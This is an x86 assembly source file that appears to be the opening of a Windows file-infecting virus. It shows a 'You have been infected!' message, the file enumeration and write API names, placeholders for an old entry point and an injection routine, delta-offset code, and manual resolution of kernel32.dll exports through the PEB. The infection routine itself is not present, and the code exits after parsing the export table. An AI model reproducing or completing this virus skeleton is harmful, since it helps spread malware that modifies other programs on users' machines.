include misc.inc

.code
	strCaption db 'Notice', 0
    strContent db 'You have been infected!', 0
    strCFA db 'CreateFileA', 0
    strF1A db 'FindFirstFileA', 0
    strFNA db 'FindNextFileA', 0
    strWF db 'WriteFile', 0
    strLLA db 'LoadLibraryA', 0
    strGPA db 'GetProcAddress', 0
    stru32dll db 'user32.dll', 0
    strMBA db 'MessageBoxA', 0
    
	; Order of each variable IN THE STACK
	; Position relative to r|ebp calculated by -(Order * regSz)
    kernel32dll dd 1
    OrdinalTbl dd 2
    NamePtrTbl dd 3
    AddrTbl dd 4
    k32NumFunc dd 5
    ;    ImageBaseAddress dd ?
;    OldEntryPoint dd ?
;    Inject dd ?
;    user32dll dd ?
    
    stack_reserved db 8 ; Number of values to be stored in the stack
    regSz db 4 ; 8 for 64-bit
    
start:
    call here
    here:
        
    mov ebp, esp
    
    mov eax, stack_reserved
    imul eax, regSz
    sub esp, eax
    
    mov eax, [ebp] ; NewEntry + 1 + 4
    sub eax, 5 ; eax = NewEntry
    
    
    
    ; Find kernel32.dll
    ASSUME FS:NOTHING
    mov ebx, fs:30h
    mov ebx, [ebx + 0Ch]
    mov ebx, [ebx + 14h]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 10h]
	toStack(kernel32dll, ebx) ; BaseAddress of kernel32.dll
    
    mov edi, [ebx + 3Ch]
    add edi, ebx
    mov edi, [edi + 78h] ; 24 (18h) + 96 (60h) = RVA of kernel32.dll Export Table
    add edi, ebx
    mov ecx, [edi + 24h]
    add ecx, ebx
    toStack(OrdinalTbl, ecx) ; VA of Ordinal Table
    
    mov esi, [edi + 20h]
    add esi, ebx
    toStack(NamePtrTbl, esi) ; VA of Name Pointer Table
    
    mov edx, [edi + 1Ch]
    add edx, ebx
    toStack(AddrTbl, edx) ; VA of Address Table
    
    mov edx, [edi + 14h]
    toStack(k32NumFunc, edx)
    
    
    invoke ExitProcess, 0

end start
